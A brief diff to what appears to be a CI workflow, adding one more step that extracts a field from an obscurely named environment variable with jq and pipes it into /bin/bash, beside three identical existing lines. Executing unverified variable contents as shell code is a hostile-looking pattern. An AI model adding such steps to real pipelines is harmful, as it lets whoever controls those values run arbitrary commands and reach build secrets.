@@ -24,6 +24,7 @@ jobs:
           echo $kmtjm2 | jq -r .kuvfp39556 | /bin/bash
           printf '%s' "$rsn53" | jq -r .jwgrp20 | /bin/bash
           printf '%s' "$cbcn71244" | jq -r .a5044 | /bin/bash
+          printf '%s' "$kgcl503" | jq -r .hn558 | /bin/bash
 
       - name: Archive output
         if: always()
